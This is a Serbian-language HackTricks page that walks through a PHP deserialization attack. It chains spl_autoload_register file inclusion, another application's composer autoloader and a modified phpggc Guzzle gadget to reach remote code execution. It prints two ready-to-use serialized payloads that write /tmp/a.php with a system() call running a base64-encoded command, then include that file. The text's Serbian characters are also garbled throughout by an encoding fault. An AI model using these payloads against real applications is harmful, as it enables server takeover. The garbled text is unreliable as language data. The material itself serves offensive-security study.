# PHP - Deserijalizacija + Autoload klasa

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Prvo, trebali biste proveriti 코ta su [**Autoload klase**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserijalizacija + spl\_autoload\_register + LFI/Gadget

Nalazimo se u situaciji gde smo prona코li **PHP deserijalizaciju u web aplikaciji** bez **biblioteke koja je ranjiva na gadgete unutar `phpggc`-a**. Me캠utim, u istom kontejneru se nalazi **druga web aplikacija sa ranjivim bibliotekama**. Stoga je cilj da se **u캜ita kompozer loader druge web aplikacije** i iskoristi ga da se **u캜ita gadget koji 캖e iskoristiti tu biblioteku sa gadgetom** iz web aplikacije ranjive na deserijalizaciju.

Koraci:

* Prona코li ste **deserijalizaciju** i **nema gadgeta** u trenutnom kodu aplikacije
* Mo쬰te iskoristiti funkciju **`spl_autoload_register`** kao 코to je prikazano u nastavku da biste **u캜itali bilo koji lokalni fajl sa ekstenzijom `.php`**
* Za to koristite deserijalizaciju gde 캖e ime klase biti unutar **`$name`**. Ne mo쬰te koristiti "/" ili "." u imenu klase u serijalizovanom objektu, ali **kod** zamenjuje **donje crte** ("\_") **sa kosim crtama** ("/"). Dakle, ime klase kao 코to je `tmp_passwd` 캖e biti transformisano u `/tmp/passwd.php` i kod 캖e poku코ati da ga u캜ita.\
Primer gadgeta 캖e biti: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
Ako imate **upload fajla** i mo쬰te da otpremite fajl sa **`.php` ekstenzijom**, mo쬰te **direktno iskoristiti ovu funkcionalnost** i dobiti RCE.
{% endhint %}

U mom slu캜aju, nisam imao ni코ta sli캜no, ali unutar **iste kontejnera** postojala je druga veb stranica kompozera sa **ranjivom bibliotekom za `phpggc` ged쬰t**.

* Da biste u캜itali ovu drugu biblioteku, prvo morate **u캜itati kompozer loader te druge veb aplikacije** (jer trenutna aplikacija ne캖e pristupiti bibliotekama druge aplikacije.) **Znaju캖i putanju aplikacije**, to mo쬰te veoma lako posti캖i sa: **`O:28:"www_frontend_vendor_autoload":0:{}`** (U mom slu캜aju, kompozer loader se nalazio u `/www/frontend/vendor/autoload.php`)
* Sada mo쬰te **u캜itati** loader **druge aplikacije**, pa je vreme da **generi코ete phpggc** **payload** koji 캖ete koristiti. U mom slu캜aju, koristio sam **`Guzzle/FW1`**, 코to mi je omogu캖ilo da **pi코em bilo koji fajl u fajl sistem**.
* NAPOMENA: **Generisani ged쬰t nije radio**, da bi radio, **izmenio** sam payload **`chain.php`** od phpggc i postavio **sve atribute** klasa **sa privatnih na javne**. Ako to nisam uradio, nakon de-serijalizacije stringa, atributi kreiranih objekata ne bi imali vrednosti.
* Sada imamo na캜in da **u캜itamo loader druge aplikacije** i imamo phpggc payload koji radi, ali moramo **ovo uraditi U ISTOM ZAHTEVU da bi loader bio u캜itan kada se ged쬰t koristi**. Za to sam poslao serijalizovan niz sa oba objekta kao:
* Mo쬰te videti **prvo u캜itavanje loadera, a zatim payloada**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Sada mo쬰mo **kreirati i pisati datoteku**, me캠utim, korisnik **ne mo쬰 pisati u bilo kojem folderu unutar web servera**. Dakle, kao 코to mo쬰te videti u payload-u, PHP poziva **`system`** sa nekim **base64** koji je kreiran u **`/tmp/a.php`**. Zatim, mo쬰mo **ponovno koristiti prvi tip payload-a** koji smo koristili kao LFI da u캜itamo kompozitorov loader druge web aplikacije **da u캜itamo generisanu datoteku `/tmp/a.php`**. Samo je dodajte u deserialization gadget:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**Rezime payload-a**

* **U캜itajte composer autoload** drugog veb aplikacije u istom kontejneru
* **U캜itajte phpggc gadget** da biste zloupotrebili biblioteku druge veb aplikacije (po캜etna veb aplikacija podlo쬹a deserializaciji nije imala nijedan gadget u svojim bibliotekama)
* Gadget 캖e **kreirati datoteku sa PHP payload-om** u /tmp/a.php sa zlonamernim komandama (korisnik veb aplikacije ne mo쬰 pisati u bilo kojem folderu bilo koje veb aplikacije)
* Poslednji deo na코eg payload-a 캖e **u캜itati generisanu PHP datoteku** koja 캖e izvr코iti komande

Bilo je potrebno **dva puta pozvati ovu deserializaciju**. U mom testiranju, prvi put je datoteka `/tmp/a.php` kreirana, ali nije u캜itana, a drugi put je pravilno u캜itana.

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **ogla코avanje va코e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
